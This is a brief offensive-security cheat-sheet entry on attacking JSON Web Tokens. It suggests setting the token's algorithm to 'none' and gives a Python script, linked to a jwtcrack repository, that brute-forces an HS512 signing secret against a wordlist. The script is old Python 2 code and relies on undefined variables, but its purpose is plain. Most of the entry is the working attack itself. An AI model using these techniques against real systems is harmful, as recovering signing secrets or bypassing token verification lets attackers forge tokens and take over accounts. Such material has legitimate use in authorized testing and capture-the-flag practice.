# set the used algorithm to "none"

# brute force the secret :
[jwtcrack.py](https://github.com/Sjord/jwtcrack.git)

```python

# pip install pyjwt
# pip install cryptography
# supports only HS256/384/512

# wordlist : https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/big.txt

import jwt
with file(wordlist) as secrets:
	for secret in secrets:
		try:
			payload = jwt.decode(encoded, secret.rstrip(), algorithms=['HS512'])
			print "\n[+] SECRET:" + secret.rstrip()
			print payload 
			break
		except jwt.InvalidTokenError:
			pass
		except jwt.DecodeError:
			pass
		else:
			pass
```